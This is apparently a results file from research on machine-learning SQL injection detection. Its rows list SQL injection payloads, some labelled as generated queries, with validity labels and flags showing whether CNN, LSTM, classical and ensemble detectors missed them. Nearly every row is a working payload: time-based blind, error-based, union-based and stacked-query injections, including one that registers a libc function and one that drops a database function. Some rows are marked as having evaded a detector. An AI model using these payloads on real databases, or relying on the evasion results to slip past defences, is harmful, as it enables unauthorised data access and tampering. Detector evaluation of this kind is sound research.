,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
5269,"-4721') or elt(4378=5165,5165) and ('fufn'='fufn","-4721') or elt(4378=5165,5165) and ('fufn'='fufn",1,1,0,0,0,0,0
5270,1'+(select xzse where 4530=4530;(select * from (select(sleep(5)))srmq))+',1'+(select xzse where 4530=4530;(select * from (select(sleep(5)))srmq))+',1,1,0,0,1,0,0
5271,-6203'))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('luee'='luee,-6203'))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('luee'='luee,1,1,0,0,0,0,0
5272,"1%');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('%'='","1%');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('%'='",1,1,0,0,0,0,0
5273,"1"")) as exzo where 7518=7518 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--","1"")) as exzo where 7518=7518 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",1,1,0,0,0,0,0
5274,1'))) and (8982=8027)*8027 and ((('qkrv'='qkrv,1'))) and (8982=8027)*8027 and ((('qkrv'='qkrv,1,1,0,0,0,0,0
5275,"1%') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('%'='","1%') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('%'='",1,1,0,0,0,0,0
5276,"1')) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('acly' like 'acly","1')) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('acly' like 'acly",1,1,0,0,0,0,0
5277,"-4606"") as elek where 8261=8261 or 8571=8571--","-4606"") as elek where 8261=8261 or 8571=8571--",1,1,0,0,0,0,0
5278,"1',(select (case when (3902=3902) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else 1/(select 0 from dual) end) from dual)","1',(select (case when (3902=3902) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else 1/(select 0 from dual) end) from dual)",1,1,0,0,0,0,0
5279,"1"") as hblk where 7982=7982 and 9611=6142--","1"") as hblk where 7982=7982 and 9611=6142--",1,1,0,0,0,0,0
5280,"-5204"") union all select 7186,7186,7186--","-5204"") union all select 7186,7186,7186--",1,1,0,0,0,0,0
5281,"1) where 1622=1622;select benchmark(5000000,md5(0x4c4d6142))--","1) where 1622=1622;select benchmark(5000000,md5(0x4c4d6142))--",1,1,0,0,0,0,0
5282,"1"" where 8379=8379 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","1"" where 8379=8379 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,1,0,0,0,0,0
5283,"1%"")));(select * from (select(sleep(5)))srmq) and (((""%""=""","1%"")));(select * from (select(sleep(5)))srmq) and (((""%""=""",1,1,0,0,0,0,0
5284,1%')) waitfor delay '0:0:5' and (('%'=',1%')) waitfor delay '0:0:5' and (('%'=',1,1,0,0,0,0,0
5285,"1%')) union all select null,null--","1%')) union all select null,null--",1,1,0,0,0,0,0
5286,"1 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)-- loao","1 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)-- loao",1,1,0,0,0,0,0
5287,"1' in boolean mode) or elt(5873=5873,sleep(5))#","1' in boolean mode) or elt(5873=5873,sleep(5))#",1,1,0,0,0,0,0
5288,1' in boolean mode);select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,1' in boolean mode);select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,1,1,0,0,0,0,0
5289,"1));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--","1));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1,1,0,0,0,0,0
5290,1') as yqld where 2489=2489;waitfor delay '0:0:5'--,1') as yqld where 2489=2489;waitfor delay '0:0:5'--,1,1,0,0,0,0,0
5291,"-5672')) union all select 9371,9371,9371,9371,9371,9371--","-5672')) union all select 9371,9371,9371,9371,9371,9371--",1,1,0,0,0,0,0
5292,"1')));select benchmark(5000000,md5(0x714e4153))#","1')));select benchmark(5000000,md5(0x714e4153))#",1,1,0,0,1,0,0
5293,"-5597') or make_set(2490=2164,2164)","-5597') or make_set(2490=2164,2164)",1,1,0,0,0,0,0
5294,"-7119"") or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (""rmzm""=""rmzm","-7119"") or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (""rmzm""=""rmzm",1,1,0,0,0,0,0
5295,"1"" and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))","1"" and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",1,1,0,0,0,0,0
5296,"1'||(select 'jfxs' from dual where 5485=5485 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--","1'||(select 'jfxs' from dual where 5485=5485 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1,1,0,0,0,0,0
5297,"1%') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('%'='","1%') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('%'='",1,1,0,0,0,0,0
5298,1) as wiyx where 6515=6515;select case when 7717=7717 then 1 else null end--,1) as wiyx where 6515=6515;select case when 7717=7717 then 1 else null end--,1,1,0,0,0,0,0
5299,"1%"")));select * from generate_series(9964,9964,case when (9964=4455) then 1 else 0 end) limit 1--","1%"")));select * from generate_series(9964,9964,case when (9964=4455) then 1 else 0 end) limit 1--",1,1,0,0,0,0,0
5300,"1') as bdei where 9531=9531 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","1') as bdei where 9531=9531 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,1,0,0,0,0,0
5301,"1%') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ('%'='","1%') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ('%'='",1,1,0,0,0,0,0
5302,"1"") where 9680=9680 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--","1"") where 9680=9680 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",1,1,0,0,1,0,0
5303,"1%"");if(9953=4347) select 9953 else drop function ocau--","1%"");if(9953=4347) select 9953 else drop function ocau--",1,1,0,0,0,0,0
5304,-4965) as imga where 3705=3705 union all select 3705--,-4965) as imga where 3705=3705 union all select 3705--,1,1,0,0,0,0,0
5305,"1) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (8898=8898","1) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (8898=8898",0,1,0,0,0,0,0
5306,"1'+(select aahc where 5436=5436 and 3824=benchmark(5000000,md5(0x76555642)))+'","1'+(select aahc where 5436=5436 and 3824=benchmark(5000000,md5(0x76555642)))+'",1,1,0,0,0,0,0
5307,"-8309'||(select 'qecl' where 8449=8449 union all select 8449,8449,8449,8449,8449,8449,8449--","-8309'||(select 'qecl' where 8449=8449 union all select 8449,8449,8449,8449,8449,8449,8449--",1,1,0,0,0,0,0
5308,"1%"");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (""%""=""","1%"");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (""%""=""",1,1,0,0,0,0,0
5309,(case when 2646=8520 then 2646 else null end),(case when 2646=8520 then 2646 else null end),0,1,0,0,0,0,0
5310,"1"") waitfor delay '0:0:5' and (""hhzy"" like ""hhzy","1"") waitfor delay '0:0:5' and (""hhzy"" like ""hhzy",1,1,0,0,0,0,0
5311,1') where 4867=4867 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,1') where 4867=4867 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,1,1,0,0,0,0,0
5312,"1"")) as uxnc where 8041=8041 and 9198=9198--","1"")) as uxnc where 8041=8041 and 9198=9198--",1,1,0,0,0,0,0
5313,"1') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ('wdru' like 'wdru","1') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ('wdru' like 'wdru",1,1,0,0,0,0,0
5314,"1') as wnys where 6457=6457 or 8514=benchmark(5000000,md5(0x544d5a4c))#","1') as wnys where 6457=6457 or 8514=benchmark(5000000,md5(0x544d5a4c))#",1,1,0,0,0,0,0
5315,1'))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('iuki'='iuki,1'))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('iuki'='iuki,1,1,0,0,0,0,0
5316,"-4807' where 3232=3232 or make_set(6599=5179,5179)--","-4807' where 3232=3232 or make_set(6599=5179,5179)--",1,1,0,0,0,0,0
5317,"1' in boolean mode) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)#","1' in boolean mode) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)#",1,1,0,0,0,0,0
5318,"1%'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--","1%'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1,1,0,0,0,0,0
5319,"1""))) and make_set(8403=8403,8899) and (((""uisi""=""uisi","1""))) and make_set(8403=8403,8899) and (((""uisi""=""uisi",1,1,0,0,0,0,0
5320,1;select pg_sleep(5)# pjvi,1;select pg_sleep(5)# pjvi,1,1,0,0,1,0,0
5321,"1)) as xutu where 5811=5811 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","1)) as xutu where 5811=5811 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",0,1,0,0,0,0,0
5322,(select (case when (3348=1710) then 3348 else cast(1 as int)/(select 0 from dual) end) from dual),(select (case when (3348=1710) then 3348 else cast(1 as int)/(select 0 from dual) end) from dual),1,1,0,0,1,0,0
5323,"1' where 4334=4334 or elt(5873=5873,sleep(5))#","1' where 4334=4334 or elt(5873=5873,sleep(5))#",1,1,0,0,0,0,0
5324,"1"") as upyn where 6185=6185 union all select null,null,null,null,null,null,null,null,null,null--","1"") as upyn where 6185=6185 union all select null,null,null,null,null,null,null,null,null,null--",1,1,0,0,0,0,0
5325,"1"") as kbjt where 2012=2012 and (5978=6898)*6898--","1"") as kbjt where 2012=2012 and (5978=6898)*6898--",1,1,0,0,0,0,0
5326,"1') where 3331=3331 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","1') where 3331=3331 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,1,0,0,0,0,0
5327,"1')) as fwhv where 3921=3921 union all select null,null--","1')) as fwhv where 3921=3921 union all select null,null--",1,1,0,0,0,0,0
5328,1)) as iihk where 5414=5414 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,1)) as iihk where 5414=5414 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,1,1,0,0,0,0,0
5329,"-5148"")) or 5310=8229","-5148"")) or 5310=8229",1,1,0,0,0,0,0
5330,"1)) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--","1)) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,1,0,0,0,0,0
5331,"1)) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((5507=5507","1)) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((5507=5507",1,1,0,0,0,0,0
5332,"1%"" and make_set(8403=8403,8899) and ""%""=""","1%"" and make_set(8403=8403,8899) and ""%""=""",1,1,0,0,0,0,0
5333,1' in boolean mode) rlike sleep(5)#,1' in boolean mode) rlike sleep(5)#,1,1,0,0,0,0,0
5334,"1"";select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#","1"";select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",1,1,0,0,0,0,0
5335,1) as fxfe where 1148=1148 or (select * from (select(sleep(5)))sddo)#,1) as fxfe where 1148=1148 or (select * from (select(sleep(5)))sddo)#,1,1,0,0,1,0,0
5336,"1%')));iif(4638=8258,1,1/0)","1%')));iif(4638=8258,1,1/0)",1,1,0,0,0,0,0
5337,"-5706"")) union all select 2013,2013,2013,2013#","-5706"")) union all select 2013,2013,2013,2013#",1,1,0,0,0,0,0
5338,"1') as ohcs where 9588=9588 or elt(6272=6272,sleep(5))--","1') as ohcs where 9588=9588 or elt(6272=6272,sleep(5))--",1,1,0,0,0,0,0
5339,-7903 where 6699=6699 or 8571=8571--,-7903 where 6699=6699 or 8571=8571--,0,1,0,0,0,0,0
5340,1' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'ukzb'='ukzb,1' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'ukzb'='ukzb,1,1,0,0,0,0,0
5341,"1"" and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')","1"" and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')",1,1,0,0,0,0,0
5342,"1'||(select 'fcws' from dual where 9184=9184 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161))||'","1'||(select 'fcws' from dual where 9184=9184 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161))||'",1,1,0,0,0,0,0
5343,1' rlike sleep(5),1' rlike sleep(5),1,1,0,0,0,0,0
5344,"-1710"")) as cvky where 1858=1858 union all select 1858,1858--","-1710"")) as cvky where 1858=1858 union all select 1858,1858--",1,1,0,0,0,0,0
5345,-2174')) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (('dyyg'='dyyg,-2174')) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (('dyyg'='dyyg,1,1,0,0,0,0,0
5346,"-4550"") as hlwe where 6026=6026 or (9364=9593)*9593--","-4550"") as hlwe where 6026=6026 or (9364=9593)*9593--",1,1,0,0,0,0,0
5347,1'||(select 'xmoq' from dual where 8047=8047 and 7533=7533)||',1'||(select 'xmoq' from dual where 8047=8047 and 7533=7533)||',1,1,0,0,0,0,0
5348,1%' and 6454=8348 and '%'=',1%' and 6454=8348 and '%'=',1,1,0,0,0,0,0
5349,1) rlike (select (case when (5477=7492) then 1 else 0x28 end)) and (4427=4427,1) rlike (select (case when (5477=7492) then 1 else 0x28 end)) and (4427=4427,1,1,0,0,0,0,0
5350,"1%')) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('%'='","1%')) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('%'='",1,1,0,0,0,0,0
5351,"1"" and 4595=4595#","1"" and 4595=4595#",1,1,0,0,0,0,0
5352,1) as qkkm where 8461=8461;select (case when (9030=9185) then 9030 else 9030*(select 9030 from information_schema.character_sets) end)#,1) as qkkm where 8461=8461;select (case when (9030=9185) then 9030 else 9030*(select 9030 from information_schema.character_sets) end)#,1,1,0,0,0,0,0
5353,"1"")) union all select null#","1"")) union all select null#",1,1,0,0,0,0,0
5354,"-7553%"" or 3571=2886","-7553%"" or 3571=2886",1,1,0,0,0,0,0
5355,1) where 4548=4548 and 9198=9198--,1) where 4548=4548 and 9198=9198--,0,1,0,0,0,0,0
5356,"1') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))","1') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",1,1,0,0,0,0,0
5357,"1) and 8407=(select count(*) from generate_series(1,5000000)) and (2160=2160","1) and 8407=(select count(*) from generate_series(1,5000000)) and (2160=2160",1,1,0,0,0,0,0
5358,"elt(2427=2427,5518)","elt(2427=2427,5518)",0,1,0,0,1,0,0
5359,"1%"")) rlike (select (case when (4207=1757) then 1 else 0x28 end)) and ((""%""=""","1%"")) rlike (select (case when (4207=1757) then 1 else 0x28 end)) and ((""%""=""",1,1,0,0,0,0,0
5360,"1')) as uncy where 8009=8009 union all select null,null,null,null,null,null,null,null,null#","1')) as uncy where 8009=8009 union all select null,null,null,null,null,null,null,null,null#",1,1,0,0,0,0,0
5361,"-9007) as gill where 6462=6462 union all select 6462,6462,6462,6462,6462,6462,6462,6462,6462#","-9007) as gill where 6462=6462 union all select 6462,6462,6462,6462,6462,6462,6462,6462,6462#",1,1,0,0,0,0,0
5362,"1';select * from generate_series(4465,4465,case when (4465=6232) then 1 else 0 end) limit 1--","1';select * from generate_series(4465,4465,case when (4465=6232) then 1 else 0 end) limit 1--",1,1,0,0,0,0,0
5363,1 where 1568=1568 or (select * from (select(sleep(5)))sddo)#,1 where 1568=1568 or (select * from (select(sleep(5)))sddo)#,1,1,0,0,1,0,0
5364,1') rlike sleep(5) and ('boto'='boto,1') rlike sleep(5) and ('boto'='boto,1,1,0,0,0,0,0
5365,"1"")) as phis where 4420=4420 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--","1"")) as phis where 4420=4420 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,1,0,0,0,0,0
5366,-2866')) or 4491=9429#,-2866')) or 4491=9429#,1,1,0,0,0,0,0
5367,"1') where 7541=7541;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--","1') where 7541=7541;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1,1,0,0,0,0,0
5368,"1);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--","1);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1,1,0,0,0,0,0
5369,"1%"")) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""%""=""","1%"")) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""%""=""",1,1,0,0,0,0,0
5370,"1') as fxuk where 6184=6184 and make_set(9292=2785,2785)--","1') as fxuk where 6184=6184 and make_set(9292=2785,2785)--",1,1,0,0,0,0,0
5371,"-6076"")) or 8277=4757","-6076"")) or 8277=4757",1,1,0,0,0,0,0
5372,1;begin user_lock.sleep(5); end,1;begin user_lock.sleep(5); end,0,1,0,0,0,0,0
5373,"1 where 6500=6500;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","1 where 6500=6500;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",0,1,0,0,0,0,0
5374,"-2717"" or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","-2717"" or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1,1,0,0,0,0,0
5375,"1%"" or 8466=benchmark(5000000,md5(0x694a4745)) and ""%""=""","1%"" or 8466=benchmark(5000000,md5(0x694a4745)) and ""%""=""",1,1,0,0,0,0,0
5376,"1%"")))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (((""%""=""","1%"")))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (((""%""=""",1,1,0,0,0,0,0
5377,"1,(select (case when (8674=7896) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)","1,(select (case when (8674=7896) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",1,1,0,0,0,0,0
5378,"1%""));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""%""=""","1%""));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""%""=""",1,1,0,0,0,0,0
5379,"1);select count(*) from generate_series(1,5000000)","1);select count(*) from generate_series(1,5000000)",1,1,0,0,1,0,0
5380,"1'+(select hsef where 4136=4136 or 8421=(select count(*) from generate_series(1,5000000)))+'","1'+(select hsef where 4136=4136 or 8421=(select count(*) from generate_series(1,5000000)))+'",1,1,0,0,0,0,0
5381,1 rlike sleep(5),1 rlike sleep(5),0,1,0,0,0,0,0
5382,"1')) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (('vedm'='vedm","1')) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (('vedm'='vedm",1,1,0,0,0,0,0
5383,"1) where 6784=6784 and elt(3114=3114,sleep(5))#","1) where 6784=6784 and elt(3114=3114,sleep(5))#",0,1,0,0,0,0,0
5384,"1"" and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ""kfps""=""kfps","1"" and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ""kfps""=""kfps",1,1,0,0,0,0,0
5385,1)) as ojjk where 3687=3687 and (4833=9218)*9218--,1)) as ojjk where 3687=3687 and (4833=9218)*9218--,0,1,0,0,0,0,0
5386,"1"") where 1614=1614 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--","1"") where 1614=1614 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",1,1,0,0,0,0,0
5387,"1"" where 3018=3018 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--","1"" where 3018=3018 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",1,1,0,0,0,0,0
5388,"-4165"" where 1772=1772 union all select 1772,1772,1772,1772,1772,1772,1772,1772--","-4165"" where 1772=1772 union all select 1772,1772,1772,1772,1772,1772,1772,1772--",1,1,0,0,0,0,0
5389,"1"") as wsyv where 8142=8142 rlike sleep(5)#","1"") as wsyv where 8142=8142 rlike sleep(5)#",1,1,0,0,0,0,0
5390,"1);select benchmark(5000000,md5(0x714e4153))#","1);select benchmark(5000000,md5(0x714e4153))#",1,1,0,0,1,0,0
5391,1)) rlike sleep(5) and ((8773=8773,1)) rlike sleep(5) and ((8773=8773,0,1,0,0,0,0,0
5392,"1"" where 9889=9889;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--","1"" where 9889=9889;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1,1,0,0,1,0,0
5393,1' where 1770=1770;select (case when (5569=9390) then 5569 else 1/(select 0) end)--,1' where 1770=1770;select (case when (5569=9390) then 5569 else 1/(select 0) end)--,1,1,0,0,0,0,0
5394,1)) as rbcf where 1053=1053;select (case when (3325=1767) then 3325 else 3325*(select 3325 from mysql.db) end)#,1)) as rbcf where 1053=1053;select (case when (3325=1767) then 3325 else 3325*(select 3325 from mysql.db) end)#,1,1,0,0,0,0,0
5395,1');begin user_lock.sleep(5); end and ('rlux' like 'rlux,1');begin user_lock.sleep(5); end and ('rlux' like 'rlux,1,1,0,0,0,0,0
5396,"1') and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('snad' like 'snad","1') and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('snad' like 'snad",1,1,0,0,0,0,0
5397,-6586')) or 2021=2996,-6586')) or 2021=2996,1,1,0,0,0,0,0
5398,"1"";select pg_sleep(5)--","1"";select pg_sleep(5)--",1,1,0,0,0,0,0
5399,"1"") as yzzk where 1813=1813 and (3020=3020)*6703--","1"") as yzzk where 1813=1813 and (3020=3020)*6703--",1,1,0,0,0,0,0
5400,1')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('trzi'='trzi,1')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('trzi'='trzi,1,1,0,0,0,0,0
